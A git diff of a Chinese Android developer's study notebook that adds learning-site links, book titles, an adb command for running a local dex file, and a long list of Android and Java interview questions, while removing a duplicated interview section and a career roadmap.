@@ -6,11 +6,16 @@
 ## Android学习网站
 
 ```
+http://androidxref.com/                 android在线源码
+
+https://www.wanandroid.com/article/list/0?cid=79        玩android黑科技
+
 https://codelabs.developers.google.com/?cat=Android         google Codelabs 代码实验室
 
 Android学习视频
 https://github.com/open-android/Android
 https://caster.io/
+http://www.maiziedu.com/article/28121/
 
 
 https://www.reddit.com/r/androiddev/                reddit 上的 Android 开发专区
@@ -46,18 +51,27 @@ https://github.com/luxiaoming   代码GG的github地址
 https://github.com/yechaoa/Android-Rapid-Development
 https://github.com/yechaoa/Android-Develop-Tips
 http://chendongmarch.github.io/
-https://blog.csdn.net/zhangbijun1230/article/details/79745654
 
 https://kymjs.com/
 
 http://blog.zhaiyifan.cn/
 
+https://blog.csdn.net/zhangbijun1230/article/details/79745654
+https://www.cnblogs.com/aademeng/category/962043.html
 https://blankj.com/
 http://zmywly8866.github.io/
 http://www.wxtlife.com/
 http://wuxiaolong.me/
 
+http://www.apkbus.com/blog/
+
+http://martinhan.site/
+
 https://www.jb51.net/Special/508.htm
+
+http://hukai.me/android-training-course-in-chinese/ux/search/setup.html
+
+https://github.com/XXApple/AndroidLibs      Android开源库整理
 ```
 
 ## 工具网站
@@ -90,11 +104,18 @@ https://www.hex-rays.com/products/ida/      逆向大利器
 《黑客与画家》
 深入理解Java虚拟机
 高级Android开发强化实战
-
+码农翻身
+《剑指Offer》
+《Android技术内幕：应用卷》
+《Android技术内幕：系统卷》
+《FFmpeg从入门到精通》
+《音视频开发进阶指南：基于Android与IOS平台的实践》
 《Android应用安全防护和逆向分析》
 《增长黑客》
 《深入探索Android热修复技术原理7.3Q》
 《神策数据-Android_全埋点技术白皮书》
+
+《写给大忙人看的Java SE 8》
 ```
 
 ## 高级工程师目标
@@ -311,6 +332,282 @@ Android源码，底层实现。
 跨平台开发技术，比如ReativeNative，flutter，week等。
 Android和其他方向的行业新技术，新动态
 Kotlin，python，Linux等。
+
+
+随着Android技术发展的成熟，Kotlin、大前端技术RN、Flutter、小程序等一下子就进入了我们的视野内，同时，Android自身的技术栈也正在不断扩展，比如前段时间Google推出的Jetpack。因此，Android开发者们越来越焦虑，越来越迷茫，每个人的时间和精力是有限的，我们到底该学什么才能有效地提高自身的竞争力呢?其实，首先我们应该优先深入学习工作中用到的技术，其次，关注这2年来Android最新的面试题所涉及的知识点，根据自身的实际情况有选择地进行针对性的学习和提升。只有这样，自身才不会被所谓的 互联网寒冬 吓倒。Awesome-Android-Interview搜集了国内一线及二线互联网公司最常出现的面试题，非常全面，笔者花费了很大的精力和时间，希望得到大家的支持。Android面试中常涉及的问题有如下几方面：
+
+1、计算机基础：TCP/IP, HTTP/HTTPS, Socket、操作系统、数据库相关。
+2、Java基础：面向对象、反射、泛型、集合类库相关。
+3、Java并发：线程/线程池，volatile，悲观锁/乐观锁等等。
+4、Jvm虚拟机：比如执行过程、JMM模型、Java的GC回收原理、类加载器。
+5、数据结构和算法：LeetCode + 剑指Offer。
+6、Android基础：启动模式、动画、自定义View。
+7、Android进阶：Binder、AIDL、进程间通信、AMS/WMS/PMS、事件分发、滑动冲突、View的绘制流程、性能优化、重要的Android源码和开源库分析。
+8、Android高新技术：模块化、组件化、热更新、插件化实现原理。
+9、最后，如果你会其他的开发方式或语言也会加分不少。比如Kotlin、ReactNative、Flutter、Python、前后端开发。
+
+
+基础
+什么是面向对象（OOP）？
+什么是多态？实现多态的机制是什么？
+接口（Interface）与抽象类（Abstract Class）的区别？
+重写（Override）与重载（Overload）的区别?
+父类的静态方法能否被子类重写？
+静态属性和静态方法是否可以被继承？是否可以被重写？为什么？
+什么是内部类？内部类、静态内部类、局部内部类和匿名内部类的区别及作用？
+== 和 equals() 和 hashCode() 的区别？
+Integer 和 int 之间的区别？
+String 转换成 Integer 的方式及原理？
+自动装箱实现原理？类型转换实现原理？
+对 String 的了解？
+String 为什么要设计成不可变的？
+final、finally 和 finalize 的区别？
+static 关键字有什么作用？
+列举 Java 的集合以及集合之间的继承关系?
+List、Set、Map 的区别？
+ArrayList、LinkedList 的区别？
+HashMap，HashTable，ConcurrentHashMap 实现原理以及区别？
+HashSet 与 HashMap 怎么判断集合元素重复？
+String、StringBuffer、StringBuilder 之间的区别？
+什么是序列化？怎么实现？有哪些方式？
+对反射的了解？
+对注解的了解？
+对依赖注入的了解？
+对泛型的了解？
+泛型中 extends 和 super 的区别？
+对 Java 的异常体系的了解？
+对解析与分派的了解？
+静态代理和动态代理的区别？有什么场景使用？
+谈谈对 Java 状态机理解？
+线程与并发
+线程和进程的区别？
+开启线程的三种方式
+如何正确的结束一个Thread?
+Thread 与 Runnable 的区别？
+run() 与 start() 方法的区别？
+sleep() 与 wait() 方法的区别？
+wait 与 notify 关键字的区别？
+synchronized 关键字的用法、作用及实现原理？
+volatile 关键字的用法、作用及实现原理？
+transient 关键字的用法、作用及实现原理？
+ReentrantLock、synchronized、volatile 之间的区别？
+什么是线程池，如何使用?
+多线程断点续传的实现原理？
+什么是深拷贝和浅拷贝？
+Java 中对象的生命周期？
+对并发编程的了解？
+JVM
+简述 JVM 内存模型和内存区域？
+简述垃圾回收器的工作原理？
+如何判断对象的生死？垃圾回收算法？新生代，老生代？
+哪些情况下的对象会被垃圾回收机制处理掉？
+垃圾回收机制与调用 System.gc() 的区别？
+强引用、软引用、弱引用、虚引用之间的区别？
+强引用设置为 null，会不会被回收？
+简述 ClassLoader 类加载机制？
+对双亲委派模型的了解？
+String a = "a"+"b"+"c" 在内存中创建几个对象？
+对 Dalvik、ART 虚拟机的了解？
+对动态加载（OSGI）的了解？
+常见编码方式有哪些？
+utf-8 编码中的中文占几个字节？int 型占几个字节？
+Android
+基础
+四大组件是什么？
+Activity 的生命周期？
+Activity 之间的通信方式？
+Activity 各种情况下的生命周期？
+横竖屏切换时 Activity 的生命周期
+前台切换到后台，然后再回到前台时 Activity 的生命周期
+弹出 Dialog 的时候按 Home 键时 Activity 的生命周期
+两个 Activity 之间跳转时的生命周期
+下拉状态栏时 Activity 的生命周期
+Activity 与 Fragment 之间生命周期比较？
+Activity 的四种 LaunchMode（启动模式）的区别？
+Activity 状态保存与恢复？
+Fragment 各种情况下的生命周期？
+Activity 和 Fragment 之间怎么通信， Fragment 和 Fragment 怎么通信？
+Service 的生命周期？
+Service 的启动方式？
+Service 与 IntentService 的区别?
+Service 和 Activity 之间的通信方式？
+对 ContentProvider 的理解？
+ContentProvider、ContentResolver、ContentObserver 之间的关系？
+对 BroadcastReceiver 的了解？
+广播的分类？使用方式和场景？
+动态广播和静态广播有什么区别？
+AlertDialog、popupWindow、Activity 之间的区别？
+Application 和 Activity 的 Context 之间的区别？
+Android 属性动画特性？
+请列举 Android 中常见的布局（Layout）类型，并简述其用法，以及排版效率。【猎豹移动】 LinearLayout、RelativeLayout、FrameLayout 的特性对比及使用场景？
+对 SurfaceView 的了解？
+Serializable 和 Parcelable 的区别？
+Android 中数据存储方式有哪些？
+屏幕适配的处理技巧都有哪些?
+Android 各个版本 API 的区别？
+动态权限适配方案，权限组的概念？
+为什么不能在子线程更新 UI？
+ListView 图片加载错乱的原理和解决方案？
+对 RecycleView 的了解？
+Recycleview 和 ListView 的区别？
+RecycleView 实现原理？
+Android Manifest 的作用与理解？
+多线程在 Android 中的使用？
+区别 Animation 和 Animator 的用法，概述实现原理？【猎豹移动】
+高级
+画出 Android 的大体架构图
+低版本 SDK 如何使用高版本 API？
+AsyncTask 如何使用?
+AsyncTask 机制、原理及不足？
+如果在 onStop() 的时候做了网络请求，onResume() 的时候怎么恢复？
+Handler 机制和底层实现？
+Handler、Thread、HandlerThread 区别？ Thread、Looper、MessageQueue、Handler、Message，每个类的功能是什么，这些类之间是什么关系？【猎豹移动】
+ThreadLocal 原理、实现及如何保证 Local 属性？
+自定义 View 的流程？如何机型适配？
+自定义 View 的时怎么获取 View 的大小？
+View 的绘制流程？
+View 的事件传递分发机制？
+requestLayout()，onLayout()，onDraw()，drawChild() 区别与联系？
+invalidate() 和 postInvalidate() 的区别？
+如何计算一个 View 的嵌套层级？
+Android 动画框架及实现原理？
+进程和 Application 的生命周期的关系？
+SpareArray 的实现原理？
+SharedPreferences 的实现眼里？是否进程同步？如何做到同步？
+ContentProvider 是如何实现数据共享的？
+ContentProvider 的权限管理？ -. Android 系统为什么会设计 ContentProvider？
+Android 线程有没有上限？
+怎么去除重复代码？
+Android 中开启摄像头的主要流程？
+对 Bitmap 对象的了解？
+图片加载原理？
+图片压缩原理？
+图片框架实现原理？LRUCache 原理？
+EventBus 实现原理？
+ButterKnife 实现原理？
+Volley 实现原理？
+okhttp 实现原理？
+服务器只提供数据接收接口，在多线程或多进程条件下，如何保证数据的有序到达？
+SQLite 数据库升级，数据迁移问题？
+数据库框架对比和源码分析？
+CAS介绍，OAuth 授权机制？
+谈谈你对安卓签名的理解
+App 是如何沙箱化，为什么要这么做？
+混合开发
+混合开发的方式？各自优缺点和使用场景？
+Hybird
+React Native
+Weex
+Flutter
+Dart
+快应用
+Framework
+请介绍一下 NDK？
+如何加载 ndk 库？如何在 jni 中注册 native 函数，有几种注册方式?【猎豹移动】
+Android 进程分类？
+谈谈对进程共享和线程安全的认识？
+谈谈对多进程开发的理解以及多进程应用场景？
+什么是协程？
+逻辑地址与物理地址，为什么使用逻辑地址？
+Android 为每个应用程序分配的内存大小是多少？
+进程保活的方式？
+系统启动流程是什么？
+一个应用程序安装到手机上的过程发生了什么？
+App 启动流程，从点击桌面开始（Activity 启动流程）？
+什么是 AIDL？解决了什么问题？如何使用？
+Binder 机制及工作原理？
+App 中唤醒其他进程的实现方式？
+Activity、Window、View 三者的关系与区别？
+ApplicationContext 和 ActivityContext 的区别？
+ActivityThread，ActivityManagerService，WindowManagerService 的工作原理？
+PackageManagerService 的工作原理？
+PowerManagerService 的工作原理？
+权限管理系统（底层的权限是如何进行 grant 的）？
+操作系统中进程和线程有什么区别？系统在什么情况下会在用户态和内核态中切换？【猎豹移动】
+如果一个 App 里面有多个进程存在，请列举你所知道的全部 IPC 方法。
+性能优化
+如何对 Android 应用进行性能分析以及优化?
+ANR 产生的原因是什么？怎么定位？
+OOM 是什么？怎么解决？是否可以 try catch？
+内存泄露的解决方法？
+ddms 和 traceView 的使用？
+性能优化如何分析 systrace？
+用 IDE 如何分析内存泄漏？
+Java 多线程引发的性能问题，怎么解决？
+启动页白屏、黑屏、太慢怎么解决？
+App 启动崩溃异常怎么捕捉？ 对于 Android App 闪退，可能有哪些原因？请针对每种情况简述分析过程。【猎豹移动】
+如何保持应用的稳定性？
+RecyclerView 和 ListView 的性能对比？
+Bitmap 如何处理大图？如何预防 OOM？
+如何缩小 Apk 的体积?
+如何统计启动时长？
+Gradle
+Gradle 源码解析
+对热修复和插件化的理解？
+插件化原理分析
+模块化实现（好处，原因）
+项目组件化的理解
+描述清点击 Android Studio 的 build 按钮后发生了什么？
+Kotlin
+谈谈对 Kotlin 的理解
+闭包和局部内部类的区别?
+网络技术
+描述一次网络请求的流程?
+TCP 中 3 次握手和 4 次挥手的过程?
+TCP 与 UDP 的区别及应用?
+HTTP 协议
+HTTP 1.0 与 2.0 的区别
+HTTP 报文结构
+HTTP 与 HTTPS 的区别以及如何实现安全性
+HTTPS 原理
+谈谈你对 WebSocket 的理解
+WebSocket 与 socket 的区别
+视频加密传输
+数据结构与算法
+数据结构
+简述常见的数据结构？
+堆的结构？
+树、B+ 树、二叉树、红黑树的了解？
+二叉树的深度优先遍历和广度优先遍历？
+堆和树的区别？
+图的了解？
+算法
+排序算法有哪些？
+最快的排序算法是哪个？
+手写冒泡排序
+手写快速排序
+快速排序的过程、时间复杂度、空间复杂度
+手写堆排序
+常见算法问题
+给阿里2万多名员工按年龄排序应该选择哪个算法？
+GC算法(各种算法的优缺点以及应用场景)
+蚁群算法与蒙特卡洛算法
+子串包含问题(KMP 算法)写代码实现
+一个无序，不重复数组，输出N个元素，使得N个元素的和相加为M，给出时间复杂度、空间复杂度。手写算法
+万亿级别的两个URL文件A和B，如何求出A和B的差集C(提示：Bit映射->hash分组->多文件读写效率->磁盘寻址以及应用层面对寻址的优化)
+两个不重复的数组集合中，求共同的元素。
+两个不重复的数组集合中，这两个集合都是海量数据，内存中放不下，怎么求共同的元素？
+一个文件中有100万个整数，由空格分开，在程序中判断用户输入的整数是否在此文件中。说出最优的方法
+一张Bitmap所占内存以及内存占用的计算
+2000万个整数，找出第五十大的数字？
+求1000以内的水仙花数以及40亿以内的水仙花数
+烧一根不均匀的绳，从头烧到尾总共需要1个小时。现在有若干条材质相同的绳子，问如何用烧绳的方法来计时一个小时十五分钟呢？
+5枚硬币，2正3反如何划分为两堆然后通过翻转让两堆中正面向上的硬8币和反面向上的硬币个数相同
+时针走一圈，时针分针重合几次
+设计模式与架构
+设计模式
+谈谈你对 Android 设计模式的理解
+项目中常用的设计模式有哪些？
+手写生产者-消费者模式？
+手写观察者模式？
+适配器模式、装饰者模式、外观模式的异同？
+架构
+MVC、MVP、MVVM 原理和区别？ 请画出 MVC、MVP 的差异？【猎豹移动】
+对 RxJava 的理解，功能与原理，优缺点？
+从 0 设计一款 App 整体架构，如何去做？
+Fragment 如果在 Adapter 中使用应该如何解耦？
+对于应用更新这块是如何做的？(解答：灰度，强制更新，分区域更新)？
+实现一个 Json 解析器（可以通过正则提高速度）？
 ```
 
 ## 必备软件
@@ -37118,6 +37415,9 @@ adb push Main.dex /data/local/tmp/
 
 // 用 dalvikvm 运行 Main.dex
 adb shell dalvikvm -cp /data/local/tmp/Main.dex Main
+
+// 或用 app_process 运行 dex 文件
+adb shell app_process -Djava.class.path=/data/local/tmp/hello.dex /data/local/tmp shellService.Main
 ```
 
 ## 查看应用的 userid
@@ -38762,8 +39062,6 @@ YUV 与 RGB 转换
 YUV 与 RGB 之间的转换，就是将 图像所有像素点的 R、G、B 分量和 Y、U、 分量相互转换。
 ```
 
-## Android Jetpack
-
 ## 安卓Webview网页秒开策略探索
 
 ```
@@ -39366,446 +39664,6 @@ Hook 技术
 开源一个 NB 的项目，为开源贡献一份力量
 转型做产品或者管理
 换一个领域继续深入研究
-```
-
-## Android 高级进阶攻略，轻松拿 Offer —— 高级工程师学习路线
-
-```
-常见 IPC 方式
-Binder 机制
-AIDL 的使用
-Handler 机制
-ThreadLocal 原理
-AsyncTask 原理
-ListView 工作原理
-阅读源码
-熟悉常见优化
-RecyclerView 工作原理
-阅读源码
-自定义 LayoutManager
-Animation 工作原理
-Activity 难点
-setResult() 和 finish() 的顺序关系？
-onSaveInstanceState() 和 onRestoreInstanceState()
-onNewIntent() 和 onConfigurationChanged()
-Service 难点
-startService 与 bindService 的区别？
-Service 中 onStartCommand 返回值的作用？
-bindService后，ServiceConnection 里面的回调方法运行在哪个线程？它们的调用时机分别是什么？
-Service 的 onCreate 运行在哪个线程？
-ContentProvider 难点
-ContentProvider 的生命周期
-ContentProvider 的 onCreate 和 CRUD 运行在哪个线程？它们是线程安全的吗？
-ContentProvider 的内部存储只能是 SQLite 吗？
-RemoteViews
-熟悉 RemoteViews 的使用，并了解其运行原理
-Material Design（材料设计）
-熟练使用材料设计的控件及布局
-自定义 View
-View 的绘制流程
-onMeasure
-onLayout
-onDraw
-invalidate() 与 postInvalidate()
-事件分发机制
-onDispatchTouchEvent
-onInterceptTouchEvent
-onTouchEvent
-事件冲突处理
-贝塞尔曲线、粒子效果
-性能优化
-布局优化：ViewStub、include、merge 的使用，它们的区别？
-过度渲染的处理
-ANR 的处理
-监控：埋点、Crash 上报
-内存优化
-OOM 的处理
-
-内存泄露的处理
-
-内存检测
-
-内存分析
-
-Bitmap 的优化：超大图的加载原理
-
-网络优化
-API 优化
-流量优化
-弱网优化
-电量优化
-WakeLock 机制
-JobScheduler 机制
-第三方开源库
-OKHttp 原理
-Retrofit 原理
-RxJava 原理
-Glide 原理：加载原理、三级缓存、LRU 算法
-Dagger2 原理
-ButterKnife 原理
-EventBus 原理
-RxJava 原理
-混合开发
-WebView
-React Native
-Flutter
-NDK 开发
-熟悉调用 JNI 方法的方式，熟悉如何回调 Java 方法。
-
-安全
-熟悉各种发编译，二次打包工具，了解 smali。
-
-动态化
-阅读 VirtualAPK、Tinker 的源码，熟悉常见的热修复和插件化原理。
-
-Gradle
-Groovy 语法
-Gradle 插件开发基础
-设计模式与架构
-熟悉 6 大基本原则
-
-MVC、MVP、MVVM
-
-组件化
-
-Jetpack
-
-其他问题
-Activity、Window，View 之间的关系？
-子线程访问 UI 却不报错的原因？
-主线程的消息循环是一个死循环，为何不会卡死？
-Binder、IBinder、IInterface 的关系？
-Java 知识
-String 常量池
-类型转换原理
-ArrayList 实现原理
-HashMap 实现原理
-常见锁（乐观锁、悲观锁），死锁解决方法
-synchronized 关键字
-volatile 关键字
-常见 IO（AIO，BIO，NIO）
-常见并发框架
-了解类加载机制
-了解垃圾回收机制
-总结
-以上就是 Android 高级工程师 需要掌握的知识点，高级工程师需要掌握的知识点还是比较多的。如果说初级工程师是打捞基础的过程，那么高级工程师就是一个沉淀技术进阶的过程。
-
-高级工程师一般是指 3 - 5 年工作经验，如果学习能力比较强 3 工作经验足够进阶到高级工程师的。应聘高级工程师薪资一般在 15k - 25k 左右，这里的薪资范围一般会根据是否有亮点上下浮动。
-
-高级工程师对 Android 的理解，不应该还停留在对 API 的使用。初级工程师可以说是对 API 熟悉的过程，高级工程师更应该注重的是 API 内部的原理，知其然而知其所以然。
-
-这个阶段阅读源码是最好的进阶方式，当然阅读源码很容易陷入细节无法自拔。这里推荐看一下高质量的博客和一些进阶书籍，根据博客和书的思路有针对性的看源码是比较推荐的方式。
-
-Android 方面推荐看下：
-
-任玉刚的《Android 开发艺术探索》
-刘望舒的《Android 进阶揭秘》
-《Android 系统源代码情景分析》
-《深入理解 Android》系列
-《深入理解 Android 热修复技术原理》
-由于 Android 与 Java 有很大的渊源，所以 Java 知识对高级工程师来说也是很重要的。这个阶段需要对 Java 有更深入的理解，还要对 Java 虚拟机有一定的研究。
-
-Java 方面推荐看下：
-
-《Java 并发编程的艺术》
-《Java 并发编程实战》
-《Java 多线程编程核心技术》
-《深入理解 Java 虚拟机》
-如果想让自己更加有亮点，推荐注重下面几个方面：
-
-创建一个 GitHub 账号，多输出一些高质量的开源项目
-拥有一个持续输出的技术博客
-阅读源码
-做技术开发的前 5 年是努力学习知识和技术沉淀的一个过程。有些人天赋比较好，进阶很快；有些人天赋虽然不好，但很勤奋，进阶也能很块。一定要让自己的工作经验与技术能力成正比，技术能力永远跟薪资成正比，能力越强薪资越高。
-
-如果以上知识点对你来说仍然太简单了，那么请接受我称你为「大佬」。敬请期待下一期 Android 资深/专家工程师 的学习指南，视频和书籍对资深/专家级别的工程师来说帮助不大了，这里不做推荐了。
-```
-
-## 面试
-
-```
-随着Android技术发展的成熟，Kotlin、大前端技术RN、Flutter、小程序等一下子就进入了我们的视野内，同时，Android自身的技术栈也正在不断扩展，比如前段时间Google推出的Jetpack。因此，Android开发者们越来越焦虑，越来越迷茫，每个人的时间和精力是有限的，我们到底该学什么才能有效地提高自身的竞争力呢?其实，首先我们应该优先深入学习工作中用到的技术，其次，关注这2年来Android最新的面试题所涉及的知识点，根据自身的实际情况有选择地进行针对性的学习和提升。只有这样，自身才不会被所谓的 互联网寒冬 吓倒。Awesome-Android-Interview搜集了国内一线及二线互联网公司最常出现的面试题，非常全面，笔者花费了很大的精力和时间，希望得到大家的支持。Android面试中常涉及的问题有如下几方面：
-
-1、计算机基础：TCP/IP, HTTP/HTTPS, Socket、操作系统、数据库相关。
-
-2、Java基础：面向对象、反射、泛型、集合类库相关。
-
-3、Java并发：线程/线程池，volatile，悲观锁/乐观锁等等。
-
-4、Jvm虚拟机：比如执行过程、JMM模型、Java的GC回收原理、类加载器。
-
-5、数据结构和算法：LeetCode + 剑指Offer。
-
-6、Android基础：启动模式、动画、自定义View。
-
-7、Android进阶：Binder、AIDL、进程间通信、AMS/WMS/PMS、事件分发、滑动冲突、View的绘制流程、性能优化、重要的Android源码和开源库分析。
-
-8、Android高新技术：模块化、组件化、热更新、插件化实现原理。
-
-9、最后，如果你会其他的开发方式或语言也会加分不少。比如Kotlin、ReactNative、Flutter、Python、前后端开发。
-
-
-基础
-什么是面向对象（OOP）？
-什么是多态？实现多态的机制是什么？
-接口（Interface）与抽象类（Abstract Class）的区别？
-重写（Override）与重载（Overload）的区别?
-父类的静态方法能否被子类重写？
-静态属性和静态方法是否可以被继承？是否可以被重写？为什么？
-什么是内部类？内部类、静态内部类、局部内部类和匿名内部类的区别及作用？
-== 和 equals() 和 hashCode() 的区别？
-Integer 和 int 之间的区别？
-String 转换成 Integer 的方式及原理？
-自动装箱实现原理？类型转换实现原理？
-对 String 的了解？
-String 为什么要设计成不可变的？
-final、finally 和 finalize 的区别？
-static 关键字有什么作用？
-列举 Java 的集合以及集合之间的继承关系?
-List、Set、Map 的区别？
-ArrayList、LinkedList 的区别？
-HashMap，HashTable，ConcurrentHashMap 实现原理以及区别？
-HashSet 与 HashMap 怎么判断集合元素重复？
-String、StringBuffer、StringBuilder 之间的区别？
-什么是序列化？怎么实现？有哪些方式？
-对反射的了解？
-对注解的了解？
-对依赖注入的了解？
-对泛型的了解？
-泛型中 extends 和 super 的区别？
-对 Java 的异常体系的了解？
-对解析与分派的了解？
-静态代理和动态代理的区别？有什么场景使用？
-谈谈对 Java 状态机理解？
-线程与并发
-线程和进程的区别？
-开启线程的三种方式
-如何正确的结束一个Thread?
-Thread 与 Runnable 的区别？
-run() 与 start() 方法的区别？
-sleep() 与 wait() 方法的区别？
-wait 与 notify 关键字的区别？
-synchronized 关键字的用法、作用及实现原理？
-volatile 关键字的用法、作用及实现原理？
-transient 关键字的用法、作用及实现原理？
-ReentrantLock、synchronized、volatile 之间的区别？
-什么是线程池，如何使用?
-多线程断点续传的实现原理？
-什么是深拷贝和浅拷贝？
-Java 中对象的生命周期？
-对并发编程的了解？
-JVM
-简述 JVM 内存模型和内存区域？
-简述垃圾回收器的工作原理？
-如何判断对象的生死？垃圾回收算法？新生代，老生代？
-哪些情况下的对象会被垃圾回收机制处理掉？
-垃圾回收机制与调用 System.gc() 的区别？
-强引用、软引用、弱引用、虚引用之间的区别？
-强引用设置为 null，会不会被回收？
-简述 ClassLoader 类加载机制？
-对双亲委派模型的了解？
-String a = "a"+"b"+"c" 在内存中创建几个对象？
-对 Dalvik、ART 虚拟机的了解？
-对动态加载（OSGI）的了解？
-常见编码方式有哪些？
-utf-8 编码中的中文占几个字节？int 型占几个字节？
-Android
-基础
-四大组件是什么？
-Activity 的生命周期？
-Activity 之间的通信方式？
-Activity 各种情况下的生命周期？
-横竖屏切换时 Activity 的生命周期
-前台切换到后台，然后再回到前台时 Activity 的生命周期
-弹出 Dialog 的时候按 Home 键时 Activity 的生命周期
-两个 Activity 之间跳转时的生命周期
-下拉状态栏时 Activity 的生命周期
-Activity 与 Fragment 之间生命周期比较？
-Activity 的四种 LaunchMode（启动模式）的区别？
-Activity 状态保存与恢复？
-Fragment 各种情况下的生命周期？
-Activity 和 Fragment 之间怎么通信， Fragment 和 Fragment 怎么通信？
-Service 的生命周期？
-Service 的启动方式？
-Service 与 IntentService 的区别?
-Service 和 Activity 之间的通信方式？
-对 ContentProvider 的理解？
-ContentProvider、ContentResolver、ContentObserver 之间的关系？
-对 BroadcastReceiver 的了解？
-广播的分类？使用方式和场景？
-动态广播和静态广播有什么区别？
-AlertDialog、popupWindow、Activity 之间的区别？
-Application 和 Activity 的 Context 之间的区别？
-Android 属性动画特性？
-请列举 Android 中常见的布局（Layout）类型，并简述其用法，以及排版效率。【猎豹移动】 LinearLayout、RelativeLayout、FrameLayout 的特性对比及使用场景？
-对 SurfaceView 的了解？
-Serializable 和 Parcelable 的区别？
-Android 中数据存储方式有哪些？
-屏幕适配的处理技巧都有哪些?
-Android 各个版本 API 的区别？
-动态权限适配方案，权限组的概念？
-为什么不能在子线程更新 UI？
-ListView 图片加载错乱的原理和解决方案？
-对 RecycleView 的了解？
-Recycleview 和 ListView 的区别？
-RecycleView 实现原理？
-Android Manifest 的作用与理解？
-多线程在 Android 中的使用？
-区别 Animation 和 Animator 的用法，概述实现原理？【猎豹移动】
-高级
-画出 Android 的大体架构图
-低版本 SDK 如何使用高版本 API？
-AsyncTask 如何使用?
-AsyncTask 机制、原理及不足？
-如果在 onStop() 的时候做了网络请求，onResume() 的时候怎么恢复？
-Handler 机制和底层实现？
-Handler、Thread、HandlerThread 区别？ Thread、Looper、MessageQueue、Handler、Message，每个类的功能是什么，这些类之间是什么关系？【猎豹移动】
-ThreadLocal 原理、实现及如何保证 Local 属性？
-自定义 View 的流程？如何机型适配？
-自定义 View 的时怎么获取 View 的大小？
-View 的绘制流程？
-View 的事件传递分发机制？
-requestLayout()，onLayout()，onDraw()，drawChild() 区别与联系？
-invalidate() 和 postInvalidate() 的区别？
-如何计算一个 View 的嵌套层级？
-Android 动画框架及实现原理？
-进程和 Application 的生命周期的关系？
-SpareArray 的实现原理？
-SharedPreferences 的实现眼里？是否进程同步？如何做到同步？
-ContentProvider 是如何实现数据共享的？
-ContentProvider 的权限管理？ -. Android 系统为什么会设计 ContentProvider？
-Android 线程有没有上限？
-怎么去除重复代码？
-Android 中开启摄像头的主要流程？
-对 Bitmap 对象的了解？
-图片加载原理？
-图片压缩原理？
-图片框架实现原理？LRUCache 原理？
-EventBus 实现原理？
-ButterKnife 实现原理？
-Volley 实现原理？
-okhttp 实现原理？
-服务器只提供数据接收接口，在多线程或多进程条件下，如何保证数据的有序到达？
-SQLite 数据库升级，数据迁移问题？
-数据库框架对比和源码分析？
-CAS介绍，OAuth 授权机制？
-谈谈你对安卓签名的理解
-App 是如何沙箱化，为什么要这么做？
-混合开发
-混合开发的方式？各自优缺点和使用场景？
-Hybird
-React Native
-Weex
-Flutter
-Dart
-快应用
-Framework
-请介绍一下 NDK？
-如何加载 ndk 库？如何在 jni 中注册 native 函数，有几种注册方式?【猎豹移动】
-Android 进程分类？
-谈谈对进程共享和线程安全的认识？
-谈谈对多进程开发的理解以及多进程应用场景？
-什么是协程？
-逻辑地址与物理地址，为什么使用逻辑地址？
-Android 为每个应用程序分配的内存大小是多少？
-进程保活的方式？
-系统启动流程是什么？
-一个应用程序安装到手机上的过程发生了什么？
-App 启动流程，从点击桌面开始（Activity 启动流程）？
-什么是 AIDL？解决了什么问题？如何使用？
-Binder 机制及工作原理？
-App 中唤醒其他进程的实现方式？
-Activity、Window、View 三者的关系与区别？
-ApplicationContext 和 ActivityContext 的区别？
-ActivityThread，ActivityManagerService，WindowManagerService 的工作原理？
-PackageManagerService 的工作原理？
-PowerManagerService 的工作原理？
-权限管理系统（底层的权限是如何进行 grant 的）？
-操作系统中进程和线程有什么区别？系统在什么情况下会在用户态和内核态中切换？【猎豹移动】
-如果一个 App 里面有多个进程存在，请列举你所知道的全部 IPC 方法。
-性能优化
-如何对 Android 应用进行性能分析以及优化?
-ANR 产生的原因是什么？怎么定位？
-OOM 是什么？怎么解决？是否可以 try catch？
-内存泄露的解决方法？
-ddms 和 traceView 的使用？
-性能优化如何分析 systrace？
-用 IDE 如何分析内存泄漏？
-Java 多线程引发的性能问题，怎么解决？
-启动页白屏、黑屏、太慢怎么解决？
-App 启动崩溃异常怎么捕捉？ 对于 Android App 闪退，可能有哪些原因？请针对每种情况简述分析过程。【猎豹移动】
-如何保持应用的稳定性？
-RecyclerView 和 ListView 的性能对比？
-Bitmap 如何处理大图？如何预防 OOM？
-如何缩小 Apk 的体积?
-如何统计启动时长？
-Gradle
-Gradle 源码解析
-对热修复和插件化的理解？
-插件化原理分析
-模块化实现（好处，原因）
-项目组件化的理解
-描述清点击 Android Studio 的 build 按钮后发生了什么？
-Kotlin
-谈谈对 Kotlin 的理解
-闭包和局部内部类的区别?
-网络技术
-描述一次网络请求的流程?
-TCP 中 3 次握手和 4 次挥手的过程?
-TCP 与 UDP 的区别及应用?
-HTTP 协议
-HTTP 1.0 与 2.0 的区别
-HTTP 报文结构
-HTTP 与 HTTPS 的区别以及如何实现安全性
-HTTPS 原理
-谈谈你对 WebSocket 的理解
-WebSocket 与 socket 的区别
-视频加密传输
-数据结构与算法
-数据结构
-简述常见的数据结构？
-堆的结构？
-树、B+ 树、二叉树、红黑树的了解？
-二叉树的深度优先遍历和广度优先遍历？
-堆和树的区别？
-图的了解？
-算法
-排序算法有哪些？
-最快的排序算法是哪个？
-手写冒泡排序
-手写快速排序
-快速排序的过程、时间复杂度、空间复杂度
-手写堆排序
-常见算法问题
-给阿里2万多名员工按年龄排序应该选择哪个算法？
-GC算法(各种算法的优缺点以及应用场景)
-蚁群算法与蒙特卡洛算法
-子串包含问题(KMP 算法)写代码实现
-一个无序，不重复数组，输出N个元素，使得N个元素的和相加为M，给出时间复杂度、空间复杂度。手写算法
-万亿级别的两个URL文件A和B，如何求出A和B的差集C(提示：Bit映射->hash分组->多文件读写效率->磁盘寻址以及应用层面对寻址的优化)
-两个不重复的数组集合中，求共同的元素。
-两个不重复的数组集合中，这两个集合都是海量数据，内存中放不下，怎么求共同的元素？
-一个文件中有100万个整数，由空格分开，在程序中判断用户输入的整数是否在此文件中。说出最优的方法
-一张Bitmap所占内存以及内存占用的计算
-2000万个整数，找出第五十大的数字？
-求1000以内的水仙花数以及40亿以内的水仙花数
-烧一根不均匀的绳，从头烧到尾总共需要1个小时。现在有若干条材质相同的绳子，问如何用烧绳的方法来计时一个小时十五分钟呢？
-5枚硬币，2正3反如何划分为两堆然后通过翻转让两堆中正面向上的硬8币和反面向上的硬币个数相同
-时针走一圈，时针分针重合几次
-设计模式与架构
-设计模式
-谈谈你对 Android 设计模式的理解
-项目中常用的设计模式有哪些？
-手写生产者-消费者模式？
-手写观察者模式？
-适配器模式、装饰者模式、外观模式的异同？
